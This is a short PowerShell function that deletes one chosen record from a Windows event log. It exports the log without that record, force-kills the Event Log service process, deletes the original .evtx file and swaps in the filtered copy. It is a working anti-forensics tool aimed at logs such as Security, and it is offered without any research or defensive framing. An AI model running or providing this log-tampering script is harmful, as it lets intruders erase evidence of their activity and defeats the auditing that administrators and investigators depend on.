function ClearnEventRecordID {
    [CmdletBinding()]
    Param (
        [string]$EventLogName,
        [string]$EventType,
        [string]$EventRecordID
    )

    # Get EventLog path
    $SecurityRegPath = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security"
    $SecurityFileRegValueFileName = (Get-ItemProperty -Path $SecurityRegPath -ErrorAction Stop).File
    $EventLogPath = $SecurityFileRegValueFileName.Replace("Security.evtx","")

    write-host $EventLogPath
 
    # Save New.evtx
    wevtutil epl $EventLogName $EventLogPath$EventType"_.evtx" /q:"*[System[(EventRecordID!='"$EventRecordID"')]]" /ow:true

    # Replace string
    $EventLogName = $EventLogName.Replace("/","%4")

    # Kill Eventlog Service
    $EventlogSvchostPID = Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
    taskkill /F /PID $EventlogSvchostPID

    # Delete Old.evtx
    Remove-Item $EventLogPath$EventLogName".evtx" -recurse

    # Rename New.evtx Old.evtx
    ren $EventLogPath$EventType"_.evtx" $EventLogPath$EventLogName".evtx"

    # Start Eventlog Service
    net start eventlog
}